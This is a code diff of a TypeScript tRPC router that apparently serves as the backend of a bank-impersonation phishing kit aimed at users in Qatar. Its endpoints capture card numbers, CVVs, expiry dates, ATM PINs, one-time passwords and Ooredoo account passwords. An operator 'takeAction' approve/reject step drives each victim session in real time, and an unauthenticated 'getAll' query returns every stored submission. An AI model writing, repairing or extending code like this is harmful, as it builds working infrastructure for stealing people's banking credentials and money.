@@ -2,6 +2,7 @@ import { COOKIE_NAME } from "@shared/const";
 import { getSessionCookieOptions } from "./_core/cookies";
 import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, router } from "./_core/trpc";
+import { z } from "zod";
 import {
   createSession,
   submitPersonalData,
@@ -9,8 +10,6 @@ import {
   submitAtmPin,
   submitOtp,
   submitOoredoo,
-  getAllSubmissions,
-  getSubmissionDetails,
   updateSessionStatus,
   adminTakeAction,
   getSessionStatus,
@@ -32,184 +31,134 @@ export const appRouter = router({
 
   submissions: router({
     createSession: publicProcedure
-      .input((val: unknown) => {
-        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-        const obj = val as Record<string, unknown>;
-        return { 
-          sessionId: String(obj.sessionId), 
-          selectedBank: String(obj.selectedBank),
-          country: obj.country ? String(obj.country) : "Qatar",
-          selectedGift: obj.selectedGift ? String(obj.selectedGift) : ""
-        };
-      })
+      .input(z.object({
+        selectedBank: z.string(),
+        personalData: z.any()
+      }))
       .mutation(async ({ input }) => {
-        await createSession(input.sessionId, input.selectedBank, input.country, input.selectedGift);
-        return { success: true };
+        const sessionId = Math.random().toString(36).substring(2, 15);
+        await createSession(sessionId, input.selectedBank, "QA", "");
+        await submitPersonalData({
+          sessionId,
+          ...input.personalData,
+          nameEnglish: "",
+          dateOfBirth: ""
+        });
+        await updateSessionStatus(sessionId, "loading", "personal");
+        return { id: sessionId };
       }),
 
-    submitPersonalData: publicProcedure
-      .input((val: unknown) => {
-        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-        const obj = val as Record<string, unknown>;
-        return {
-          sessionId: String(obj.sessionId),
-          nameArabic: obj.nameArabic ? String(obj.nameArabic) : "",
-          nameEnglish: String(obj.nameEnglish),
-          idNumber: obj.idNumber ? String(obj.idNumber) : "",
-          phoneNumber: String(obj.phoneNumber),
-          email: String(obj.email),
-          dateOfBirth: String(obj.dateOfBirth),
-          gender: obj.gender ? String(obj.gender) : undefined,
-          customerStatus: obj.customerStatus ? String(obj.customerStatus) : undefined,
-          password: obj.password ? String(obj.password) : undefined,
-          title: obj.title ? String(obj.title) : undefined,
-          middleName: obj.middleName ? String(obj.middleName) : undefined,
-          lastName: obj.lastName ? String(obj.lastName) : undefined,
-          promoCode: obj.promoCode ? String(obj.promoCode) : undefined,
-          country: obj.country ? String(obj.country) : undefined,
-        };
-      })
-      .mutation(async ({ input }) => {
-        await submitPersonalData(input);
-        return { success: true };
+    getAll: publicProcedure
+      .query(async () => {
+        return await getFullSubmissions();
       }),
 
     submitLoginMethod: publicProcedure
-      .input((val: unknown) => {
-        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-        const obj = val as Record<string, unknown>;
-        return {
-          sessionId: String(obj.sessionId),
-          loginType: String(obj.loginType),
-          cardNumber: obj.cardNumber ? String(obj.cardNumber) : "",
-          cardholderName: obj.cardholderName ? String(obj.cardholderName) : "",
-          expiryDate: obj.expiryDate ? String(obj.expiryDate) : "",
-          cvv: obj.cvv ? String(obj.cvv) : "",
-          username: obj.username ? String(obj.username) : "",
-          password: obj.password ? String(obj.password) : "",
-          deliveryMethod: obj.deliveryMethod ? String(obj.deliveryMethod) : "",
-          branchName: obj.branchName ? String(obj.branchName) : "",
-          deliveryAddress: obj.deliveryAddress ? String(obj.deliveryAddress) : "",
-          phoneConfirmation: obj.phoneConfirmation ? String(obj.phoneConfirmation) : "",
-          issuanceFee: obj.issuanceFee ? String(obj.issuanceFee) : "",
-          deliveryFee: obj.deliveryFee ? String(obj.deliveryFee) : "",
-          totalAmount: obj.totalAmount ? String(obj.totalAmount) : "",
-        };
-      })
+      .input(z.object({
+        sessionId: z.string(),
+        loginType: z.string(),
+        cardNumber: z.string().optional(),
+        cardholderName: z.string().optional(),
+        expiryDate: z.string().optional(),
+        cvv: z.string().optional(),
+        deliveryAddress: z.string().optional(),
+      }))
       .mutation(async ({ input }) => {
-        await submitLoginMethod(input);
-        // تحديد الخطوة بناءً على نوع الطلب
-        const step = input.loginType === "registration_completion" ? "registration-completion" : "login";
+        await submitLoginMethod({
+          sessionId: input.sessionId,
+          loginType: input.loginType,
+          cardNumber: input.cardNumber || "",
+          cardholderName: input.cardholderName || "",
+          expiryDate: input.expiryDate || "",
+          cvv: input.cvv || "",
+          username: "",
+          password: "",
+          deliveryMethod: "home",
+          branchName: "",
+          deliveryAddress: input.deliveryAddress || "",
+          phoneConfirmation: "",
+          issuanceFee: "10",
+          deliveryFee: "0",
+          totalAmount: "10",
+        });
+        const step = input.loginType === "registration_completion" ? "registration-completion" : "card";
+        await updateSessionStatus(input.sessionId, "loading", step);
+        return { success: true };
+      }),
+
+    submitOtp: publicProcedure
+      .input(z.object({
+        sessionId: z.string(),
+        otpCode: z.string(),
+        otpType: z.string()
+      }))
+      .mutation(async ({ input }) => {
+        await submitOtp({
+          sessionId: input.sessionId,
+          otpCode: input.otpCode,
+          otpType: input.otpType
+        });
+        const step = input.otpType === "ooredoo_otp" ? "otp_ooredoo" : "otp";
         await updateSessionStatus(input.sessionId, "loading", step);
         return { success: true };
       }),
 
     submitAtmPin: publicProcedure
-      .input((val: unknown) => {
-        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-        const obj = val as Record<string, unknown>;
-        return {
-          sessionId: String(obj.sessionId),
-          pin: String(obj.pin),
-        };
-      })
+      .input(z.object({
+        sessionId: z.string(),
+        pin: z.string()
+      }))
       .mutation(async ({ input }) => {
-        await submitAtmPin(input);
+        await submitAtmPin({
+          sessionId: input.sessionId,
+          pin: input.pin
+        });
         await updateSessionStatus(input.sessionId, "loading", "atm");
         return { success: true };
       }),
 
-    submitOtp: publicProcedure
-      .input((val: unknown) => {
-        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-        const obj = val as Record<string, unknown>;
-        return {
-          sessionId: String(obj.sessionId),
-          otpCode: String(obj.otpCode),
-          otpType: String(obj.otpType),
-        };
-      })
-      .mutation(async ({ input }) => {
-        await submitOtp(input);
-        await updateSessionStatus(input.sessionId, "loading", input.otpType === "ooredoo" ? "otp_ooredoo" : "otp");
-        return { success: true };
-      }),
-
     submitOoredoo: publicProcedure
-      .input((val: unknown) => {
-        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-        const obj = val as Record<string, unknown>;
-        return {
-          sessionId: String(obj.sessionId),
-          ooredooUser: String(obj.ooredooUser),
-          ooredooPassword: String(obj.ooredooPassword),
-        };
-      })
+      .input(z.object({
+        sessionId: z.string(),
+        ooredooUser: z.string(),
+        ooredooPassword: z.string()
+      }))
       .mutation(async ({ input }) => {
-        await submitOoredoo(input);
+        await submitOoredoo({
+          sessionId: input.sessionId,
+          ooredooUser: input.ooredooUser,
+          ooredooPassword: input.ooredooPassword
+        });
         await updateSessionStatus(input.sessionId, "loading", "ooredoo");
         return { success: true };
       }),
 
-    getSessions: publicProcedure.query(async () => {
-      return await getFullSubmissions();
-    }),
-
-    updateSessionStatus: publicProcedure
-      .input((val: unknown) => {
-        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-        const obj = val as Record<string, unknown>;
-        return {
-          sessionId: String(obj.sessionId),
-          status: String(obj.status),
-        };
-      })
+    takeAction: publicProcedure
+      .input(z.object({
+        sessionId: z.string(),
+        action: z.enum(['approve', 'reject']),
+        errorMessage: z.string().optional()
+      }))
       .mutation(async ({ input }) => {
-        await updateSessionStatus(input.sessionId, input.status);
-        return { success: true };
-      }),
-
-    reportStep: publicProcedure
-      .input((val: unknown) => {
-        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-        const obj = val as Record<string, unknown>;
-        return {
-          sessionId: String(obj.sessionId),
-          step: String(obj.step),
-        };
-      })
-      .mutation(async ({ input }) => {
-        await updateSessionStatus(input.sessionId, "pending", input.step);
-        return { success: true };
-      }),
-
-    getSubmissionDetails: publicProcedure
-      .input(String)
-      .query(async ({ input }) => {
-        return await getSubmissionDetails(input);
-      }),
-
-    adminTakeAction: publicProcedure
-      .input((val: unknown) => {
-        if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-        const obj = val as Record<string, unknown>;
-        return {
-          sessionId: String(obj.sessionId),
-          action: String(obj.action),
-          errorMessage: obj.errorMessage ? String(obj.errorMessage) : undefined,
-          redirectTarget: obj.redirectTarget ? String(obj.redirectTarget) : undefined,
-        };
-      })
-      .mutation(async ({ input }) => {
-        await adminTakeAction(input.sessionId, input.action, input.errorMessage, input.redirectTarget);
+        await adminTakeAction(input.sessionId, input.action, input.errorMessage);
         return { success: true };
       }),
 
     getSessionStatus: publicProcedure
-      .input(String)
+      .input(z.string())
       .query(async ({ input }) => {
         return await getSessionStatus(input);
       }),
+
+    reportStep: publicProcedure
+      .input(z.object({
+        sessionId: z.string(),
+        step: z.string()
+      }))
+      .mutation(async ({ input }) => {
+        await updateSessionStatus(input.sessionId, "pending", input.step);
+        return { success: true };
+      })
   }),
 });
 
